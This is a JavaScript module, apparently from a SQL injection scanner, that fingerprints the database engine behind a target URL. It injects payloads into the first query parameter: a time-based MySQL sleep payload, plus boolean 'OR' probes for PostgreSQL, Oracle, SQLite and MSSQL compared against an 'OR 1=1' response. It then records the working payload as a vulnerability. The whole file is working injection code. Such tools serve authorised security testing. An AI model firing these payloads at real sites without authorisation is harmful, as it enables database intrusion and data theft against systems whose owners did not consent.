import { dbSaveScan, dbSaveVulnerability } from "./database.js";
import { mutateQuery, isSameRes } from "./helper.js";
import { sendRequest } from "./http.js";
import { printInfo, printSuccess } from "./logger.js";

const SLEEP_SEC = 5;
const THRESHOLD_MS = SLEEP_SEC * 1000 * 0.7;

export async function detectFingerprint(setting) {
	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const c = setting.contextChar;

	// MySQL: time method: compare response time from a sleep(0)
	// and sleep(5)
	printInfo(`Testing for engine: MYSQL`);
	const mysql = await detectMySqlTime(setting, query, firstParamsName, firstParamsValue, c);
	if (mysql !== null) {
		return saveEngine(setting, "MYSQL", firstParamsName, mysql.params, mysql.payload, "time");
	}

	// Other engines: boolean method: compare an engine-unique true expression
	// against the generic OR 1=1 page.
	const truePage = await sendRequest(setting, mutateQuery(query, firstParamsName, `${firstParamsValue}${c} OR 1=1-- 42`));
	const probes = [
		{ name: "POSTGRESQL", expr: "version() LIKE 'PostgreSQL%'" },
		{ name: "ORACLE", expr: "ROWNUM>=0" },
		{ name: "SQLITE", expr: "sqlite_version() LIKE '3%'" },
		{ name: "MSSQL", expr: "@@version LIKE 'Microsoft%'" },
	];

	for (const { name, expr } of probes) {
		printInfo(`Testing for engine: ${name}`);

		const payload = `${firstParamsValue}${c} OR ${expr}-- 42`;
		const params = mutateQuery(query, firstParamsName, payload);

		const res = await sendRequest(setting, params);
		if (isSameRes(truePage, res)) {
			return saveEngine(setting, name, firstParamsName, params, payload, "boolean");
		}
	}
	return "UNKNOWN";
}

async function detectMySqlTime(setting, query, name, valueBase, c) {
	const control = await sendRequest(setting, mutateQuery(query, name, sleepPayload(valueBase, c, 0)));

	const payload = sleepPayload(valueBase, c, SLEEP_SEC);
	const params = mutateQuery(query, name, payload);
	const res = await sendRequest(setting, params);

	if (res.time - control.time >= THRESHOLD_MS) {
		return { payload, params };
	}
	return null;
}

function sleepPayload(valueBase, c, sec) {
	return `${valueBase}${c} OR (SELECT 1 FROM (SELECT sleep(${sec}))x)-- 42`;
}

function saveEngine(setting, name, paramName, params, payload, method) {
	printSuccess(`Engine Detected: ${name}`);

	const url = setting.urlPath.concat("?", params.toString());
	const id = dbSaveScan(setting.db, url, setting.x, name);
	setting.scanId = id;
	dbSaveVulnerability(setting.db, id, paramName, payload, method);

	return name;
}
